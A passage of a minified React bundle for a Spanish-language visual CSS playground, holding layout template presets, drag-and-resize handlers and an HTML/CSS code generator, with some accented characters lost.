1"},{x:577,y:120,width:285,height:150,bgColor:"#818cf8",borderRadius:12,opacity:.9,rotation:0,zIndex:1,label:"Stat 2"},{x:877,y:120,width:292,height:150,bgColor:"#34d399",borderRadius:12,opacity:.9,rotation:0,zIndex:1,label:"Stat 3"},{x:277,y:292,width:592,height:382,bgColor:"#1e293b",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Chart"},{x:885,y:292,width:285,height:382,bgColor:"#1e293b",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Activity"}]},{name:"Formulario Login",icon:"",boxes:[{x:300,y:60,width:600,height:570,bgColor:"#1e293b",borderRadius:20,opacity:1,rotation:0,zIndex:1,label:"Card"},{x:390,y:105,width:420,height:75,bgColor:"transparent",borderRadius:0,opacity:1,rotation:0,zIndex:2,label:"Ttulo"},{x:390,y:210,width:420,height:66,bgColor:"#334155",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Input Email"},{x:390,y:300,width:420,height:66,bgColor:"#334155",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Input Pass"},{x:390,y:405,width:420,height:72,bgColor:"#10b981",borderRadius:10,opacity:1,rotation:0,zIndex:2,label:"Iniciar Sesin"},{x:390,y:510,width:420,height:45,bgColor:"transparent",borderRadius:0,opacity:.6,rotation:0,zIndex:2,label:"No tens cuenta"}]},{name:"Precios",icon:"",boxes:[{x:30,y:30,width:345,height:630,bgColor:"#1e293b",borderRadius:16,opacity:1,rotation:0,zIndex:1,label:"Plan Free"},{x:60,y:60,width:285,height:45,bgColor:"transparent",borderRadius:0,opacity:.7,rotation:0,zIndex:2,label:"Free Title"},{x:60,y:120,width:285,height:75,bgColor:"transparent",borderRadius:0,opacity:1,rotation:0,zIndex:2,label:"Price 0"},{x:60,y:525,width:285,height:66,bgColor:"#334155",borderRadius:10,opacity:1,rotation:0,zIndex:2,label:"Select Free"},{x:420,y:15,width:360,height:660,bgColor:"#10b981",borderRadius:16,opacity:1,rotation:0,zIndex:1,label:"Plan Pro"},{x:450,y:45,width:300,height:45,bgColor:"transparent",borderRadius:0,opacity:.9,rotation:0,zIndex:2,label:"Pro Title"},{x:450,y:105,width:300,height:75,bgColor:"transparent",borderRadius:0,opacity:1,rotation:0,zIndex:2,label:"Price 29"},{x:450,y:540,width:300,height:66,bgColor:"#0c4a6e",borderRadius:10,opacity:1,rotation:0,zIndex:2,label:"Select Pro"},{x:825,y:30,width:345,height:630,bgColor:"#1e293b",borderRadius:16,opacity:1,rotation:0,zIndex:1,label:"Plan Enterprise"},{x:855,y:60,width:285,height:45,bgColor:"transparent",borderRadius:0,opacity:.7,rotation:0,zIndex:2,label:"Enterprise Title"},{x:855,y:120,width:285,height:75,bgColor:"transparent",borderRadius:0,opacity:1,rotation:0,zIndex:2,label:"Price Custom"},{x:855,y:525,width:285,height:66,bgColor:"#334155",borderRadius:10,opacity:1,rotation:0,zIndex:2,label:"Contact Sales"}]},{name:"Pie de Pgina",icon:"",boxes:[{x:30,y:30,width:1140,height:390,bgColor:"#0f172a",borderRadius:14,opacity:1,rotation:0,zIndex:1,label:"Footer BG"},{x:60,y:60,width:210,height:45,bgColor:"#10b981",borderRadius:6,opacity:1,rotation:0,zIndex:2,label:"Logo"},{x:60,y:135,width:210,height:180,bgColor:"transparent",borderRadius:0,opacity:.6,rotation:0,zIndex:2,label:"Descripcin"},{x:360,y:60,width:180,height:30,bgColor:"transparent",borderRadius:0,opacity:.8,rotation:0,zIndex:2,label:"Producto"},{x:360,y:105,width:150,height:22,bgColor:"transparent",borderRadius:0,opacity:.5,rotation:0,zIndex:2,label:"Features"},{x:360,y:142,width:150,height:22,bgColor:"transparent",borderRadius:0,opacity:.5,rotation:0,zIndex:2,label:"Pricing"},{x:600,y:60,width:180,height:30,bgColor:"transparent",borderRadius:0,opacity:.8,rotation:0,zIndex:2,label:"Compaa"},{x:600,y:105,width:150,height:22,bgColor:"transparent",borderRadius:0,opacity:.5,rotation:0,zIndex:2,label:"About"},{x:600,y:142,width:150,height:22,bgColor:"transparent",borderRadius:0,opacity:.5,rotation:0,zIndex:2,label:"Contact"},{x:870,y:60,width:180,height:30,bgColor:"transparent",borderRadius:0,opacity:.8,rotation:0,zIndex:2,label:"Redes"},{x:870,y:105,width:45,height:45,bgColor:"#334155",borderRadius:50,opacity:1,rotation:0,zIndex:2,label:"TW"},{x:930,y:105,width:45,height:45,bgColor:"#334155",borderRadius:50,opacity:1,rotation:0,zIndex:2,label:"GH"},{x:990,y:105,width:45,height:45,bgColor:"#334155",borderRadius:50,opacity:1,rotation:0,zIndex:2,label:"LI"},{x:60,y:360,width:1080,height:2,bgColor:"#334155",borderRadius:0,opacity:.5,rotation:0,zIndex:2,label:"Divider"},{x:60,y:378,width:300,height:22,bgColor:"transparent",borderRadius:0,opacity:.4,rotation:0,zIndex:2,label:"Copyright"}]},{name:"E-Commerce",icon:"",boxes:[{x:30,y:15,width:1140,height:75,bgColor:"#0f172a",borderRadius:10,opacity:1,rotation:0,zIndex:1,label:"Navbar"},{x:30,y:105,width:270,height:570,bgColor:"#1e293b",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Filters"},{x:315,y:105,width:270,height:360,bgColor:"#1e293b",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Product 1"},{x:330,y:120,width:240,height:195,bgColor:"#334155",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Img 1"},{x:600,y:105,width:270,height:360,bgColor:"#1e293b",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Product 2"},{x:615,y:120,width:240,height:195,bgColor:"#334155",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Img 2"},{x:885,y:105,width:270,height:360,bgColor:"#1e293b",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Product 3"},{x:900,y:120,width:240,height:195,bgColor:"#334155",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Img 3"},{x:315,y:480,width:270,height:195,bgColor:"#1e293b",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Product 4"},{x:600,y:480,width:270,height:195,bgColor:"#1e293b",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Product 5"},{x:885,y:480,width:270,height:195,bgColor:"#1e293b",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Product 6"}]},{name:"Artculo de Blog",icon:"",boxes:[{x:150,y:15,width:900,height:300,bgColor:"#334155",borderRadius:16,opacity:1,rotation:0,zIndex:1,label:"Cover Image"},{x:150,y:337,width:900,height:60,bgColor:"transparent",borderRadius:0,opacity:1,rotation:0,zIndex:1,label:"Blog Title"},{x:150,y:412,width:450,height:30,bgColor:"transparent",borderRadius:0,opacity:.5,rotation:0,zIndex:1,label:"Author Date"},{x:150,y:465,width:900,height:22,bgColor:"transparent",borderRadius:0,opacity:.6,rotation:0,zIndex:1,label:"Text Line 1"},{x:150,y:502,width:870,height:22,bgColor:"transparent",borderRadius:0,opacity:.6,rotation:0,zIndex:1,label:"Text Line 2"},{x:150,y:540,width:885,height:22,bgColor:"transparent",borderRadius:0,opacity:.6,rotation:0,zIndex:1,label:"Text Line 3"},{x:150,y:592,width:600,height:22,bgColor:"transparent",borderRadius:0,opacity:.6,rotation:0,zIndex:1,label:"Text Line 4"},{x:150,y:645,width:180,height:45,bgColor:"#10b981",borderRadius:6,opacity:1,rotation:0,zIndex:1,label:"Read More"}]},{name:"App de Chat",icon:"",boxes:[{x:30,y:15,width:330,height:660,bgColor:"#0f172a",borderRadius:14,opacity:1,rotation:0,zIndex:1,label:"Contacts Panel"},{x:45,y:30,width:300,height:66,bgColor:"#1e293b",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Search"},{x:45,y:111,width:300,height:75,bgColor:"#10b981",borderRadius:8,opacity:.2,rotation:0,zIndex:2,label:"Contact Active"},{x:45,y:195,width:300,height:75,bgColor:"#1e293b",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Contact 2"},{x:45,y:279,width:300,height:75,bgColor:"#1e293b",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Contact 3"},{x:375,y:15,width:795,height:75,bgColor:"#1e293b",borderRadius:10,opacity:1,rotation:0,zIndex:1,label:"Chat Header"},{x:390,y:112,width:300,height:60,bgColor:"#334155",borderRadius:12,opacity:1,rotation:0,zIndex:2,label:"Msg Received"},{x:780,y:195,width:375,height:60,bgColor:"#10b981",borderRadius:12,opacity:.8,rotation:0,zIndex:2,label:"Msg Sent"},{x:390,y:277,width:420,height:60,bgColor:"#334155",borderRadius:12,opacity:1,rotation:0,zIndex:2,label:"Msg Received 2"},{x:825,y:360,width:330,height:60,bgColor:"#10b981",borderRadius:12,opacity:.8,rotation:0,zIndex:2,label:"Msg Sent 2"},{x:375,y:600,width:795,height:75,bgColor:"#1e293b",borderRadius:10,opacity:1,rotation:0,zIndex:1,label:"Input Bar"},{x:390,y:615,width:660,height:48,bgColor:"#334155",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Type Message"},{x:1065,y:615,width:90,height:48,bgColor:"#10b981",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Send"}]},{name:"Pgina de Perfil",icon:"",boxes:[{x:225,y:15,width:750,height:240,bgColor:"#1e293b",borderRadius:16,opacity:1,rotation:0,zIndex:1,label:"Cover"},{x:510,y:150,width:180,height:180,bgColor:"#10b981",borderRadius:100,opacity:1,rotation:0,zIndex:2,label:"Avatar"},{x:450,y:352,width:300,height:45,bgColor:"transparent",borderRadius:0,opacity:1,rotation:0,zIndex:1,label:"Username"},{x:465,y:405,width:270,height:22,bgColor:"transparent",borderRadius:0,opacity:.5,rotation:0,zIndex:1,label:"Bio Line"},{x:375,y:465,width:150,height:54,bgColor:"#10b981",borderRadius:8,opacity:1,rotation:0,zIndex:1,label:"Follow"},{x:540,y:465,width:150,height:54,bgColor:"#334155",borderRadius:8,opacity:1,rotation:0,zIndex:1,label:"Message"},{x:705,y:465,width:120,height:54,bgColor:"#334155",borderRadius:8,opacity:1,rotation:0,zIndex:1,label:"More"},{x:225,y:555,width:240,height:150,bgColor:"#1e293b",borderRadius:10,opacity:1,rotation:0,zIndex:1,label:"Post 1"},{x:480,y:555,width:240,height:150,bgColor:"#1e293b",borderRadius:10,opacity:1,rotation:0,zIndex:1,label:"Post 2"},{x:735,y:555,width:240,height:150,bgColor:"#1e293b",borderRadius:10,opacity:1,rotation:0,zIndex:1,label:"Post 3"}]},{name:"App Mvil",icon:"",boxes:[{x:390,y:15,width:420,height:690,bgColor:"#0f172a",borderRadius:30,opacity:1,rotation:0,zIndex:1,label:"Phone Frame"},{x:405,y:30,width:390,height:45,bgColor:"#1e293b",borderRadius:0,opacity:1,rotation:0,zIndex:2,label:"Status Bar"},{x:405,y:82,width:390,height:75,bgColor:"#1e293b",borderRadius:0,opacity:1,rotation:0,zIndex:2,label:"App Bar"},{x:420,y:172,width:360,height:180,bgColor:"#10b981",borderRadius:14,opacity:.8,rotation:0,zIndex:2,label:"Banner"},{x:420,y:367,width:172,height:120,bgColor:"#1e293b",borderRadius:12,opacity:1,rotation:0,zIndex:2,label:"Widget 1"},{x:607,y:367,width:172,height:120,bgColor:"#1e293b",borderRadius:12,opacity:1,rotation:0,zIndex:2,label:"Widget 2"},{x:420,y:502,width:360,height:75,bgColor:"#1e293b",borderRadius:10,opacity:1,rotation:0,zIndex:2,label:"List Item 1"},{x:420,y:585,width:360,height:75,bgColor:"#1e293b",borderRadius:10,opacity:1,rotation:0,zIndex:2,label:"List Item 2"},{x:405,y:667,width:390,height:45,bgColor:"#1e293b",borderRadius:0,opacity:1,rotation:0,zIndex:2,label:"Bottom Nav"}]},{name:"Tablero Kanban",icon:"",boxes:[{x:15,y:15,width:1170,height:60,bgColor:"#1e293b",borderRadius:8,opacity:1,rotation:0,zIndex:1,label:"Board Header"},{x:15,y:90,width:375,height:600,bgColor:"#111827",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Col Todo"},{x:30,y:105,width:345,height:37,bgColor:"#ef4444",borderRadius:6,opacity:.3,rotation:0,zIndex:2,label:"Todo Header"},{x:30,y:157,width:345,height:90,bgColor:"#1e293b",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Task 1"},{x:30,y:262,width:345,height:90,bgColor:"#1e293b",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Task 2"},{x:30,y:367,width:345,height:90,bgColor:"#1e293b",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Task 3"},{x:405,y:90,width:375,height:600,bgColor:"#111827",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Col In Progress"},{x:420,y:105,width:345,height:37,bgColor:"#f59e0b",borderRadius:6,opacity:.3,rotation:0,zIndex:2,label:"Progress Header"},{x:420,y:157,width:345,height:90,bgColor:"#1e293b",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Task 4"},{x:420,y:262,width:345,height:90,bgColor:"#1e293b",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Task 5"},{x:795,y:90,width:375,height:600,bgColor:"#111827",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Col Done"},{x:810,y:105,width:345,height:37,bgColor:"#34d399",borderRadius:6,opacity:.3,rotation:0,zIndex:2,label:"Done Header"},{x:810,y:157,width:345,height:90,bgColor:"#1e293b",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Task 6"}]},{name:"Pgina de Inicio",icon:"",boxes:[{x:30,y:7,width:1140,height:67,bgColor:"#0f172a",borderRadius:10,opacity:1,rotation:0,zIndex:3,label:"Top Nav"},{x:30,y:82,width:1140,height:270,bgColor:"#1e293b",borderRadius:16,opacity:1,rotation:0,zIndex:1,label:"Hero Banner"},{x:75,y:135,width:450,height:52,bgColor:"transparent",borderRadius:0,opacity:1,rotation:0,zIndex:2,label:"Headline"},{x:75,y:202,width:375,height:30,bgColor:"transparent",borderRadius:0,opacity:.5,rotation:0,zIndex:2,label:"Subheadline"},{x:75,y:262,width:180,height:57,bgColor:"#10b981",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Get Started"},{x:900,y:105,width:240,height:225,bgColor:"#334155",borderRadius:12,opacity:.7,rotation:0,zIndex:2,label:"Hero Image"},{x:30,y:375,width:360,height:180,bgColor:"#1e293b",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Feature 1"},{x:420,y:375,width:360,height:180,bgColor:"#1e293b",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Feature 2"},{x:810,y:375,width:360,height:180,bgColor:"#1e293b",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Feature 3"},{x:300,y:585,width:600,height:90,bgColor:"#0f172a",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"CTA Section"},{x:450,y:607,width:300,height:48,bgColor:"#818cf8",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Sign Up Free"}]},{name:"Configuracin",icon:"",boxes:[{x:30,y:15,width:300,height:660,bgColor:"#0f172a",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Settings Menu"},{x:45,y:30,width:270,height:45,bgColor:"transparent",borderRadius:0,opacity:1,rotation:0,zIndex:2,label:"Settings Title"},{x:45,y:90,width:270,height:54,bgColor:"#10b981",borderRadius:8,opacity:.15,rotation:0,zIndex:2,label:"General Active"},{x:45,y:153,width:270,height:54,bgColor:"transparent",borderRadius:8,opacity:.6,rotation:0,zIndex:2,label:"Security"},{x:45,y:216,width:270,height:54,bgColor:"transparent",borderRadius:8,opacity:.6,rotation:0,zIndex:2,label:"Notifications"},{x:45,y:279,width:270,height:54,bgColor:"transparent",borderRadius:8,opacity:.6,rotation:0,zIndex:2,label:"Billing"},{x:345,y:15,width:825,height:660,bgColor:"#1e293b",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Content Area"},{x:375,y:45,width:300,height:37,bgColor:"transparent",borderRadius:0,opacity:1,rotation:0,zIndex:2,label:"Section Title"},{x:375,y:112,width:765,height:66,bgColor:"#334155",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Input Name"},{x:375,y:202,width:765,height:66,bgColor:"#334155",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Input Email"},{x:375,y:292,width:765,height:66,bgColor:"#334155",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Input Bio"},{x:945,y:390,width:195,height:60,bgColor:"#10b981",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Save Changes"}]}],Ms=1200,Ns=1200;let jee=0;const hd=()=>`box-${++jee}-${Date.now()}`,$i=(a,e)=>Math.round(a/e*1e4)/100,Rf=(a,e)=>Math.round(a/100*e),Dee=()=>{const[a,e]=U.useState([{id:hd(),x:60,y:60,width:200,height:150,bgColor:"#10b981",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Box 1"},{id:hd(),x:300,y:100,width:160,height:120,bgColor:"#818cf8",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Box 2"}]),[t,n]=U.useState(new Set),[i,r]=U.useState(null),[l,u]=U.useState(null),[d,p]=U.useState(""),[f,h]=U.useState(!1),[E,C]=U.useState(!1),[A,j]=U.useState(!1),[R,I]=U.useState(!1),[w,k]=U.useState(!1),[Y,ee]=U.useState(!1),[Q,q]=U.useState(!1),[M,N]=U.useState("row"),[L,_]=U.useState("nowrap"),[V,F]=U.useState("flex-start"),[ce,me]=U.useState("flex-start"),[Z,re]=U.useState("flex-start"),[Ee,je]=U.useState(10),[G,J]=U.useState(""),[de,B]=U.useState(""),[Re,Oe]=U.useState(""),[_e,Xe]=U.useState(""),[xa,ha]=U.useState("10"),St=U.useRef(null),tn=t.size>0?Array.from(t)[t.size-1]:null,Ve=tn&&a.find(X=>X.id===tn)||null;U.useEffect(()=>{Ve&&(J((R?$i(Ve.x,Ms):Ve.x).toString()),B((R?$i(Ve.y,Ns):Ve.y).toString()),Oe((R?$i(Ve.width,Ms):Ve.width).toString()),Xe((R?$i(Ve.height,Ns):Ve.height).toString()))},[Ve,R,Ve?.id,Ve?.x,Ve?.y,Ve?.width,Ve?.height]),U.useEffect(()=>{ha(Ee.toString())},[Ee]);const ti=(X,ye)=>{n(we=>{const Ae=new Set(ye?we:[]);return Ae.has(X)&&ye?Ae.delete(X):Ae.add(X),Ae})},nn=(X,ye)=>{if(X.stopPropagation(),X.target.classList.contains("resize-handle"))return;const we=X.ctrlKey||X.shiftKey||X.metaKey;!we&&!t.has(ye.id)?n(new Set([ye.id])):ti(ye.id,we);const Ae=St.current?.getBoundingClientRect();if(!Ae)return;const Qe=t.has(ye.id)?t:new Set([...t,ye.id]),ma=new Map;a.forEach(ra=>{Qe.has(ra.id)&&ma.set(ra.id,{x:ra.x,y:ra.y})}),r({id:ye.id,offsetX:X.clientX-Ae.left-ye.x,offsetY:X.clientY-Ae.top-ye.y,snapshots:ma})},Ii=(X,ye)=>{X.stopPropagation(),X.preventDefault(),t.has(ye.id)||n(new Set([ye.id]));const we=t.has(ye.id)?t:new Set([...t,ye.id]),Ae=new Map;a.forEach(Qe=>{we.has(Qe.id)&&Ae.set(Qe.id,{x:Qe.x,y:Qe.y,w:Qe.width,h:Qe.height})}),u({id:ye.id,startX:X.clientX,startY:X.clientY,snapshots:Ae})},on=U.useCallback(X=>{if(i){const ye=St.current?.getBoundingClientRect();if(!ye)return;const we=i.snapshots.get(i.id);if(!we)return;const Ae=X.clientX-ye.left-i.offsetX,Qe=X.clientY-ye.top-i.offsetY,ma=Ae-we.x,ra=Qe-we.y;e(ya=>ya.map(We=>{const jt=i.snapshots.get(We.id);return jt?{...We,x:Math.max(0,Math.round(jt.x+ma)),y:Math.max(0,Math.round(jt.y+ra))}:We}))}if(l){const ye=X.clientX-l.startX,we=X.clientY-l.startY,Ae=l.snapshots.get(l.id);if(!Ae)return;const Qe=Ae.w>0?(Ae.w+ye)/Ae.w:1,ma=Ae.h>0?(Ae.h+we)/Ae.h:1;e(ra=>ra.map(ya=>{const We=l.snapshots.get(ya.id);if(!We)return ya;const jt=We.x-Ae.x,Ct=We.y-Ae.y;return{...ya,x:Math.max(0,Math.round(Ae.x+jt*Qe)),y:Math.max(0,Math.round(Ae.y+Ct*ma)),width:Math.max(30,Math.round(We.w*Qe)),height:Math.max(30,Math.round(We.h*ma))}}))}},[i,l]),Nn=U.useCallback(()=>{r(null),u(null)},[]);U.useEffect(()=>(window.addEventListener("mousemove",on),window.addEventListener("mouseup",Nn),()=>{window.removeEventListener("mousemove",on),window.removeEventListener("mouseup",Nn)}),[on,Nn]);const mo=()=>{const X={id:hd(),x:40+Math.random()*200,y:40+Math.random()*200,width:120+Math.round(Math.random()*100),height:80+Math.round(Math.random()*80),bgColor:Sy[Math.floor(Math.random()*Sy.length)],borderRadius:8,opacity:1,rotation:0,zIndex:a.length+1,label:`Box ${a.length+1}`};e(ye=>[...ye,X]),n(new Set([X.id]))},qa=X=>{e(ye=>ye.filter(we=>we.id!==X)),n(ye=>{const we=new Set(ye);return we.delete(X),we})},za=X=>{const ye=a.find(Ae=>Ae.id===X);if(!ye)return;const we={...ye,id:hd(),x:ye.x+20,y:ye.y+20,label:ye.label+" (copy)"};e(Ae=>[...Ae,we]),n(new Set([we.id]))},Ba=(X,ye)=>{e(we=>we.map(Ae=>Ae.id===X?{...Ae,...ye}:Ae))},zt=X=>{e(ye=>ye.map(we=>t.has(we.id)?{...we,...X}:we))},fo=(X,ye,we)=>{const Ae=a.find(ra=>ra.id===X);if(!Ae||Ae.width===0&&Ae.height===0)return;const Qe=ye/Ae.width,ma=we/Ae.height;e(ra=>ra.map(ya=>ya.id===X?{...ya,width:Math.round(ye),height:Math.round(we)}:{...ya,x:Math.round(ya.x*Qe),y:Math.round(ya.y*ma),width:Math.max(30,Math.round(ya.width*Qe)),height:Math.max(30,Math.round(ya.height*ma))}))},ht=()=>{e([]),n(new Set)},ni=X=>{const ye=X.boxes.map(we=>({...we,id:hd()}));e(ye),n(new Set)},fe=U.useCallback(()=>{let X=`<div class="container">
`;const ye=R?"100%":`${Ms}px`,we=R?"100%":`${Ns}px`;let Ae=`.container {
`;Ae+=`  width: ${ye};
`,Ae+=`  height: ${we};
`,Ae+=`  background: #0a0a0a;
`,Ae+=`  border-radius: 12px;
`,Ae+=`  overflow: hidden;
`,Q?(Ae+=`  display: flex;
`,Ae+=`  flex-direction: ${M};
`,Ae+=`  flex-wrap: ${L};
`,Ae+=`  justify-content: ${V};
`,Ae+=`  align-items: ${ce};
`,L!=="nowrap"&&(Ae+=`  align-content: ${Z};
`),Ae+=`  gap: ${Ee}px;
`,Ae+=`  padding: 20px;
`):Ae+=`  position: relative;
`,Ae+=`}

`,a.forEach(Qe=>{const ma=Qe.label.toLowerCase().replace(/[^a-z0-9]/g,"-").replace(/-+/g,"-");X+=`  <div class="${ma}"></div>
`,Ae+=`.${ma} {
`,Q||(Ae+=`  position: absolute;
`,R?(Ae+=`  left: ${$i(Qe.x,Ms)}%;
`,Ae+=`  top: ${$i(Qe.y,Ns)}%;
`):(Ae+=`  left: ${Qe.x}px;
`,Ae+=`  top: ${Qe.y}px;
`)),R?(Ae+=`  width: ${$i(Qe.width,Ms)}%;
`,Ae+=`  height: ${$i(Qe.height,Ns)}%;
`):(Ae+=`  width: ${Qe.width}px;
`,Ae+=`  height: ${Qe.height}px;
`),Ae+=`  background-color: ${Qe.bgColor};
`,Qe.borderRadius>0&&(Ae+=`  border-radius: ${Qe.borderRadius}px;
`),Qe.opacity<1&&(Ae+=`  opacity: ${Qe.opacity};
`),Qe.rotation!==0&&(Ae+=`  transform: rotate(${Qe.rotation}deg);
`),Ae+=`  z-index: ${Qe.zIndex};
`,Ae+=`  flex-shrink: 0;
`,Ae+=`}

`}),X+="</div>",p(`/* === HTML === */
${X}

/* === CSS === */
${Ae}`)},[a,R,Q,M,L,V,ce,Z,Ee]);U.useEffect(()=>{fe()},[fe]);const Pe=()=>{navigator.clipboard.writeText(d),h(!0),setTimeout(()=>h(!1),2e3)};return b.jsxs("div",{className:"divplayground-root",children:[b.jsxs("header",{className:"divplayground-header",children:[b.jsx("div",{className:"divplayground-title-row",children:b.jsxs("h1",{className:"divplayground-title",children:[b.jsx("span",{className:"divplayground-tag",children:"<div>"}),b.jsx("span",{className:"divplayground-subtitle",children:"CSS Visual Playground"})]})}),b.jsxs("div",{className:"divplayground-actions",children:[b.jsx("button",{className:`dp-btn ${w?"dp-btn-active":"dp-btn-ghost"}`,onClick:()=>k(!w),title:"Escalar todas las cajas proporcionalmente",children:w?b.jsxs(b.Fragment,{children:[b.jsx(nH,{size:16})," Proporcional"]}):b.jsxs(b.Fragment,{children:[b.jsx(oH,{size:16})," Libre"]})}),b.jsxs("button",{className:"dp-btn dp-btn-danger",onClick:ht,children:[b.jsx(mP,{size:16})," Limpiar"]})]})]}),E&&b.jsx("div",{className:"presets-bar animate-slide-down",children:wee.map(X=>b.jsx("button",{className:"preset-chip",onClick:()=>ni(X),children:b.jsx("span",{children:X.name})},X.name))}),b.jsxs("div",{className:"divplayground-workspace",children:[b.jsxs("div",{className:"dp-editor-panel animate-slide-right",children:[b.jsx("div",{className:"dp-editor-section",children:b.jsxs("div",{style:{display:"flex",gap:"0.5rem",marginBottom:"0.5rem"},children:[b.jsxs("button",{className:"dp-btn dp-btn-primary w-full justify-center",onClick:mo,children:[b.jsx(MD,{size:16})," Nueva caja"]}),b.jsx("button",{className:`dp-btn w-full justify-center ${E?"dp-btn-active":"dp-btn-ghost"}`,onClick:()=>C(!E),children:E?b.jsxs(b.Fragment,{children:[b.jsx(_1,{size:16})," Cerrar"]}):b.jsxs(b.Fragment,{children:[b.jsx(_o,{size:16})," Plantillas"]})})]})}),b.jsxs("div",{className:"dp-editor-section",style:{borderLeft:Q?"4px solid #10b981":"4px solid #6366f1",position:"relative"},children:[b.jsxs("div",{style:{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:"1rem"},children:[b.jsx("h3",{className:"dp-editor-title",style:{margin:0},children:"Layout del Canvas"}),b.jsx("button",{className:`dp-info-trigger ${Y?"active":""}`,onClick:()=>ee(!Y),title:"Informacin sobre los modos de layout",children:b.jsx(RD,{size:14})})]}),Y&&b.jsxs("div",{className:"dp-layout-info-box animate-slide-down",children:[b.jsxs("p",{children:[b.jsx("strong",{children:"Modo Absolute:"})," Control total (X, Y). Las cajas pueden encimarse. Ideal para composiciones especficas."]}),b.jsxs("p",{children:[b.jsx("strong",{children:"Modo Flexbox:"})," RECOMENDADO: Las cajas se alinean automticamente. Ideal para interfaces responsivas."]})]}),b.jsxs("div",{className:"dp-property-grid",children:[b.jsx("button",{className:`dp-btn dp-btn-xs ${Q?"dp-btn-active":"dp-btn-ghost"}`,onClick:()=>q(!Q),style:{width:"100%",justifyContent:"center"},children:Q?b.jsxs(b.Fragment,{children:[b.jsx(_o,{size:12})," Flexbox"]}):b.jsxs(b.Fragment,{children:[b.jsx(Zr,{size:12})," Absolute"]})}),Q&&b.jsxs(b.Fragment,{children:[b.jsx("div",{style:{gridColumn:"1/-1",height:"1px",background:"rgba(255,255,255,0.05)",margin:"0.25rem 0"}}),b.jsx("label",{children:"Direccin"}),b.jsxs("select",{value:M,onChange:X=>N(X.target.value),className:"dp-select",children:[b.jsx("option",{value:"row",children:"Horizontal (Row)"}),b.jsx("option",{value:"row-reverse",children:"Horizontal Inv."}),b.jsx("option",{value:"column",children:"Vertical (Column)"}),b.jsx("option",{value:"column-reverse",children:"Vertical Inv."})]}),b.jsx("label",{children:"Envolver (Wrap)"}),b.jsxs("select",{value:L,onChange:X=>_(X.target.value),className:"dp-select",children:[b.jsx("option",{value:"nowrap",children:"No Wrap"}),b.jsx("option",{value:"wrap",children:"Wrap"}),b.jsx("option",{value:"wrap-reverse",children:"Wrap Reverse"})]}),b.jsx("label",{children:"Justificar"}),b.jsxs("select",{value:V,onChange:X=>F(X.target.value),className:"dp-select",children:[b.jsx("option",{value:"flex-start",children:"Inicio"}),b.jsx("option",{value:"center",children:"Centro"}),b.jsx("option",{value:"flex-end",children:"Fin"}),b.jsx("option",{value:"space-between",children:"Espaciado (Between)"}),b.jsx("option",{value:"space-around",children:"Espaciado (Around)"}),b.jsx("option",{value:"space-evenly",children:"Espaciado (Evenly)"})]}),b.jsx("label",{children:"Alinear Items"}),b.jsxs("select",{value:ce,onChange:X=>me(X.target.value),className:"dp-select",children:[b.jsx("option",{value:"flex-start",children:"Inicio"}),b.jsx("option",{value:"center",children:"Centro"}),b.jsx("option",{value:"flex-end",children:"Fin"}),b.jsx("option",{value:"baseline",children:"Lnea base"}),b.jsx("option",{value:"stretch",children:"Estirar (Stretch)"})]}),L!=="nowrap"&&b.jsxs(b.Fragment,{children:[b.jsx("label",{children:"Alinear Cont."}),b.jsxs("select",{value:Z,onChange:X=>re(X.target.value),className:"dp-select",children:[b.jsx("option",{value:"flex-start",children:"Inicio"}),b.jsx("option",{value:"center",children:"Centro"}),b.jsx("option",{value:"flex-end",children:"Fin"}),b.jsx("option",{value:"space-between",children:"Between"}),b.jsx("option",{value:"space-around",children:"Around"}),b.jsx("option",{value:"stretch",children:"Stretch"})]})]}),b.jsx("label",{children:"Espacio (Gap)"}),b.jsx("input",{type:"number",value:xa,onChange:X=>{ha(X.target.value),X.target.value!==""&&je(+X.target.value)},style:{padding:"0.4rem"}})]})]})]}),b.jsxs("div",{className:"dp-editor-section",children:[b.jsxs("h3",{className:"dp-editor-title",children:["Capas ",t.size>1&&b.jsxs("span",{className:"dp-unit-badge",children:[t.size," sel."]})]}),b.jsx("div",{className:"dp-layers",children:a.map(X=>b.jsxs("div",{className:`dp-layer 